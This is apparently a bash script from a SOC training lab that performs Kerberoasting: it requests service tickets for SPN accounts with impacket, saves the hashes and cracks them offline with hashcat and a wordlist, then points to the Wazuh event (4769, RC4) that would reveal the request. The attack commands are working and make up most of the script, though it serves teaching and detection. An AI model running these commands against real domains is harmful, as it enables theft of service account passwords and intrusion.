#!/usr/bin/env bash
# Lab 03 — Kerberoasting: extract and crack a service account's password.
# MITRE ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${HERE}/../lib/common.sh"

echo "== Lab 03: Kerberoasting =="
confirm_lab
need_creds                       # any valid domain user can Kerberoast
ensure_impacket || exit 1
ensure_hashcat  || true

OUT="${HERE}/kerberoast.hashes"

step "Request service tickets for all SPN accounts (T1558.003)"
say "As ${LAB_USER}, asking the DC for a TGS for every account with an SPN."
say "The ticket is encrypted with the service account's password hash — crackable offline."
impacket-GetUserSPNs "${DOMAIN}/${LAB_USER}:${LAB_PASS}" -dc-ip "$DC_IP" -request \
  -outputfile "$OUT" || { err "GetUserSPNs failed — check creds / DC reachability."; exit 1; }

echo; ok "Hashes written to: $OUT"; echo
grep -o '\$krb5tgs\$[^ ]*' "$OUT" | head -n1 | cut -c1-80 | sed 's/$/.../' || true

step "Crack the ticket offline (no traffic to the DC — invisible to defenders)"
WL="${HERE}/wordlist.txt"                        # small lab list that contains the weak pw
if RY="$(ensure_rockyou)"; then
  say "Using lab wordlist + rockyou (${RY})."
  cat "$WL" "$RY" > /tmp/soc-wl.txt 2>/dev/null; WL=/tmp/soc-wl.txt
else
  say "rockyou not available; using the bundled lab wordlist."
fi

if have hashcat; then
  hashcat -m 13100 -a 0 "$OUT" "$WL" --potfile-disable -o "${HERE}/cracked.txt" || true
  echo
  if [[ -s "${HERE}/cracked.txt" ]]; then
    ok "CRACKED:"; cat "${HERE}/cracked.txt"
    warn "That's a Domain service account password recovered offline. Now think"
    warn "about how a defender could ever have caught the request that enabled it."
  else
    warn "Nothing cracked with this list — try a bigger wordlist (that's realistic)."
  fi
else
  warn "hashcat not installed. Crack elsewhere with: hashcat -m 13100 $OUT <wordlist>"
fi

hunt "In Wazuh (agent soc-dc01): the request shows as 4769 (service ticket requested) — specifically for svc_sql's SPN and, tellingly, with Ticket Encryption Type 0x17 (RC4). The CRACK itself is offline and generates NO logs. See 03-kerberoasting/DETECTION.md."
ok "Lab 03 complete."
